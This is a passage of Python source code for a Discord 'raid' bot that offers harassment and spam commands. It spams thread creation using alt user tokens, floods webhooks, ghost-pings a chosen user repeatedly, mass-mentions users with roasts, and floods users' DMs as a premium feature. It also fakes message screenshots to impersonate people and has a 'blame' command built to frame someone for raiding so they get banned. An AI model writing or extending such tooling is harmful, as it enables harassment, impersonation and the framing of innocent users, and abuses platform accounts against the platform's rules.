    userId = ctx.user.id
    
    dihcord = f"https://discord.com/api/v10/channels/{channelid}/threads"
    
    payload = {
        "name": message,
        "type": 11,  # public thread
        "auto_archive_duration": 1440,
    }

    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0"
    }

    # Send initial response
    await ctx.response.send_message(
        "# ***Cyber Spammer EZZ***\n"
        "**DISCLAIMER:**\n"
        "- Use ***ONLY*** alt usertokens for this command \n"
        "- Use ur main token = ban from dihcord \n"
        "-# and oh ya if shi doesn't work the token/channelid was incorrect or the account doesnt have access to create threads in the channel",
        ephemeral=True
    )

    async with aiohttp.ClientSession() as session:
        for i in range(amount):
            try:
                async with session.post(dihcord, headers=headers, json=payload) as resp:
                    if resp.status == 403:
                        print(f"[{userId} - /threadspam ] Missing Permissions (403)")
                        await ctx.followup.send(f"[{userId} - /threadspam ] Missing Permissions (403)")
                        break
                    if resp.status == 400:
                        print(f"[{userId} - /threadspam ] Bad Request (400)")
                        await ctx.followup.send(f"[{userId} - /threadspam ] Bad Request (400)")
                        break
                    if not resp.ok:
                        print(f"/threadspam Error status {resp.status}")
                        await ctx.followup.send(f"/threadspam Error status {resp.status}")
                        break
            except Exception as err:
                print(f"[{userId} - /threadspam ] Network/fetch error: {str(err)}")
                await ctx.followup.send(f"[{userId} - /threadspam ] Network/fetch error: {str(err)}")
                break

            if i < amount - 1:
                await asyncio.sleep(delay / 1000)
    
    await ctx.followup.send(f"Done spamming {amount} threads!")
    
@bot.tree.command(name="webhookspam", description="Spam a webhook")
@app_commands.describe(
    webhook_url="The Discord webhook URL",
    msg="The message to send",
    amount="How many messages to send (1–999)",
    name="Custom webhook username",
    pfp_image_link="Custom webhook profile picture (image URL)"
)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.user_install()
async def webhookspam(
    interaction: discord.Interaction, 
    webhook_url: str, 
    msg: str, 
    amount: int = 1, 
    name: str = "Xenostopic", 
    pfp_image_link: str = None
):
    if amount < 1: amount = 1
    if amount > 999: amount = 999
    if not re.match(r'^https://discord\.com/api/webhooks/', webhook_url):
        await interaction.response.send_message("invalid webhook url", ephemeral=True)
        return

    await interaction.response.send_message(f"sending **{amount}** messages to webhook...", ephemeral=True)
    async with aiohttp.ClientSession() as session:
        payload = {
            "content": msg,
            "username": name,
        }
        if pfp_image_link:
            payload["avatar_url"] = pfp_image_link

        for _ in range(amount):
            try:
                async with session.post(webhook_url, json=payload) as resp:
                    if resp.status == 429: # Hit a rate limit
                        retry_after = (await resp.json()).get("retry_after", 1)
                        await asyncio.sleep(retry_after)
            except Exception as err:
                print(f"[/webhookspam] error: {err}")

         
@bot.tree.command(name="say", description="Make the bot say something you want, anonymously.")
@app_commands.describe(message="The message you want the bot to say.")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.user_install()
async def say(interaction: discord.Interaction, message: str):
    if is_premium_user(interaction.user.id):
        full_message = f"{message}"
    else:
        full_message = f"{message} \n\n"

    await interaction.response.send_message("Sending.. 🔊", ephemeral=True)
    allowed = discord.AllowedMentions(everyone=True, users=True, roles=True)
    await interaction.followup.send(full_message, allowed_mentions=allowed)

    await log_command_use(
        user=interaction.user,
        command_name="say",
        message=message,
        channel=interaction.channel
    )
    update_leaderboard(interaction.user.id, "say")


@bot.tree.command(
    name="ghostping",
    description="GhostPing Somebody multiple times! The best delay is 0.3 seconds"
)
@app_commands.describe(
    user="📔 The user you want to ghost ping",
    seconds="🕰️ The delay (in seconds) before each message is deleted. Best is 0.3 🕰️",
    times="🔁 How many times to ghost ping them 🔁"
)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.user_install()
async def ghostping(
    interaction: discord.Interaction,
    user: discord.User,
    seconds: float = 0.3,
    times: int = 3
):
    await interaction.response.send_message("Ghost pinging...", ephemeral=True)
    await log_command_use(interaction.user, "ghostping")
    update_leaderboard(interaction.user.id, "ghostping")

    for i in range(times):
        try:
            message = await interaction.followup.send(f"{user.mention}")
            await asyncio.sleep(seconds)
            await message.delete()
        except discord.HTTPException as e:
            if e.code == 40094:  
                print(f"[ghostping] follow up messages reached – stopped after {i} pings.")
                break
            else:
                raise

whitelist = config.get("whitelist", [])

@bot.tree.command(name="x-add-premium", description="Grant premium access to a user. (owner only)")
@app_commands.describe(user="The user to grant premium access to")
async def add_premium(interaction: discord.Interaction, user: discord.User):
    if interaction.user.id not in whitelist:
        await interaction.response.send_message("❌ You don't have permission to use this command.", ephemeral=True)
        return
    
    add_premium_user(user.id)
    await interaction.response.send_message(f"✅ {user.mention} has been granted premium access!", ephemeral=False)

@bot.tree.command(name="x-rem-premium", description="Remove premium access from a user. (owner only)")
@app_commands.describe(user="The user to remove premium access from")
async def rem_premium(interaction: discord.Interaction, user: discord.User):
    if interaction.user.id not in whitelist:
        await interaction.response.send_message("❌ You don't have permission to use this command.", ephemeral=True)
        return

    removed = remove_premium_user(user.id)
    if removed:
        await interaction.response.send_message(f"✅ User {user.mention} has been removed from premium access!", ephemeral=False)
    else:
        await interaction.response.send_message(f"⚠️ User {user.mention} does not have premium access.", ephemeral=True)



class RoastButton(discord.ui.View):
    def __init__(self, user: discord.User, delay: float = 0.5):
        super().__init__()
        self.user = user
        self.delay = delay

    @discord.ui.button(label="⚡ Send Roast", style=discord.ButtonStyle.blurple)
    async def roast_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        max_retries = 2

        try:
            with open("roasts.txt", "r", encoding="utf-8") as f:
                roasts = [line.strip() for line in f if line.strip()]
            if not roasts:
                await interaction.followup.send("No roasts found 😅")
                return
        except FileNotFoundError:
            await interaction.followup.send("The file `roasts.txt` was not found.")
            return

        for _ in range(5):
            roast_text = random.choice(roasts)
            retries = 0
            while retries <= max_retries:
                try:
                    allowed = discord.AllowedMentions(everyone=True, users=True, roles=True)
                    await interaction.followup.send(f"{roast_text} {self.user.mention}", allowed_mentions=allowed)
                    await asyncio.sleep(self.delay + random.uniform(0.1, 0.5))
                    break
                except discord.errors.HTTPException as e:
                    if e.status == 429:
                        retry_after = getattr(e, "retry_after", 1.5)
                        retry_after = min(retry_after, 5)
                        print(f"Rate limit hit, retrying after {retry_after:.2f}s (retry {retries + 1}/{max_retries})")
                        await asyncio.sleep(retry_after)
                        retries += 1
                    else:
                        raise e
            else:
                print("Failed to send roast after max retries, skipping.")


@bot.tree.command(name="roast", description="Send a random roast to a user via button.")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.describe(user="The user to roast")
async def roast(interaction: discord.Interaction, user: discord.User):
    view = RoastButton(user, delay=0.5)
    await interaction.response.send_message("Press the button to send roasts! (5 per click)", view=view, ephemeral=True)



def random_time_today():
    base_date = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
    random_minutes = random.randint(0, 23 * 60 + 59)  # 0 bis 1439 Minuten
    random_time = base_date + timedelta(minutes=random_minutes)
    return random_time

@bot.tree.command(name="spoof-message", description="Send a realistic fake message as image.")
@app_commands.describe(username="Name to display", message="Fake message to show", avatar_url="Avatar image URL")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def spoof_image(interaction: discord.Interaction, username: str, message: str, avatar_url: str = None):
    await interaction.response.send_message("🕵️ Spoofing message...", ephemeral=True)

    if not avatar_url:
        avatar_url = "https://cdn.discordapp.com/embed/avatars/0.png"

    response = requests.get(avatar_url)
    avatar = Image.open(BytesIO(response.content)).convert("RGBA")
    avatar = avatar.resize((40, 40), Image.LANCZOS)

    mask = Image.new("L", avatar.size, 0)
    draw_mask = ImageDraw.Draw(mask)
    draw_mask.ellipse((0, 0) + avatar.size, fill=255)
    avatar = ImageOps.fit(avatar, mask.size, centering=(0.5, 0.5))
    avatar.putalpha(mask)

    width, height = 800, 80
    img = Image.new("RGBA", (width, height), "#36393F")
    draw = ImageDraw.Draw(img)

    font_bold = ImageFont.truetype("arialbd.ttf", 18)
    font_regular = ImageFont.truetype("arial.ttf", 16)
    font_timestamp = ImageFont.truetype("arial.ttf", 12)

    img.paste(avatar, (20, 20), avatar)
    now = random_time_today().strftime("Today at %I:%M %p").lstrip("0").replace(" 0", " ")

    draw.text((70, 18), username, font=font_bold, fill=(255, 255, 255))
    draw.text((70 + draw.textlength(username, font=font_bold) + 10, 21), now, font=font_timestamp, fill=(153, 170, 181))
    draw.text((70, 45), message, font=font_regular, fill=(220, 221, 222))

    buffer = BytesIO()
    img.save(buffer, format="PNG")
    buffer.seek(0)
    file = discord.File(fp=buffer, filename="spoof.png")

    await interaction.followup.send(file=file)

    await log_command_use(user=interaction.user, command_name="spoof-message", message=message)
    update_leaderboard(interaction.user.id, "spoof-message")



@bot.tree.command(name="blame", description="Blame somebody else for raiding, and get them banned!")
@app_commands.describe(user="📰 The user you want to blame..")
async def blame(interaction: discord.Interaction, user: discord.User):
    await interaction.response.send_message("Blaming... ✏️", ephemeral=True)
    await interaction.followup.send(f"{user.mention}, Your Raid Command has been Successfully Completed! ✅")
    await log_command_use(interaction.user, "blame")



@bot.tree.command(name="anon-dm", description="Anonymously DM someone with a message.")
@app_commands.describe(user="The user you want to DM", message="The message to send")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.user_install()
async def anon_dm(interaction: discord.Interaction, user: discord.User, message: str):
    try:
        await user.send(f"{message}")
        await interaction.response.send_message("Message sent anonymously ✅", ephemeral=True)
    except discord.Forbidden:
        await interaction.response.send_message("❌ Couldn't send message. User has DMs closed.", ephemeral=True)
    await log_command_use(
        user=interaction.user,
        command_name="anon-dm",
        channel=interaction.channel,
        message=message
    )


@bot.tree.command(name="flooduser", description="[💎] Flood a user's DMs with messages. (premium only!)")
@app_commands.describe(user="The user to DM spam", message="Message to spam", times="How many times to send", delay="Delay between messages (in sec)")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.user_install()
async def flooduser(interaction: discord.Interaction, user: discord.User, message: str, times: int = 5, delay: float = 0.3):
    if not is_premium_user(interaction.user.id):
     await interaction.response.send_message("💎 This command is only available for premium users.", ephemeral=True)
     return
    await interaction.response.send_message("Flooding user... 💣", ephemeral=True)
    await log_command_use(
        user=interaction.user,
        command_name="💎 flooduser",
        channel=interaction.channel,
        message=message
    )
    for _ in range(times):
        try:
            await user.send(message)
            await asyncio.sleep(delay)
        except discord.Forbidden:
            await interaction.followup.send("❌ Could not DM user (they may have DMs closed).", ephemeral=True)
            break



@bot.event
async def on_ready():
    print(logo)
    print(f"{Fore.MAGENTA}>{Fore.WHITE} Logged in as {Fore.MAGENTA}{bot.user}{Fore.WHITE}.")
    try:
        synced = await bot.tree.sync()
        print(f"{Fore.MAGENTA}>{Fore.WHITE} Synced {Fore.MAGENTA}{len(synced)} {Fore.WHITE}commands{Fore.MAGENTA}.{Fore.WHITE}")
    except Exception as e:
        print(f"Failed to sync commands: {e}")


if __name__ == "__main__":
    TOKEN = token_management()
    if TOKEN:
        try:
            bot.run(TOKEN)
        except discord.errors.LoginFailure:
            print(Fore.RED + "Can't connect to token. Please check your token.")
            input(Fore.YELLOW + "Press Enter to go back to the menu...")
            TOKEN = token_management()  
            if TOKEN:
                bot.run(TOKEN)  
        except Exception as e:
            print(Fore.RED + f"An unexpected error occurred: {e}")
            input(Fore.YELLOW + "Press Enter to restart the menu...")
            TOKEN = token_management() 
            if TOKEN:
                bot.run(TOKEN)  
    else:
        print(Fore.RED + "❌ Error: Unable to load or set a token.")
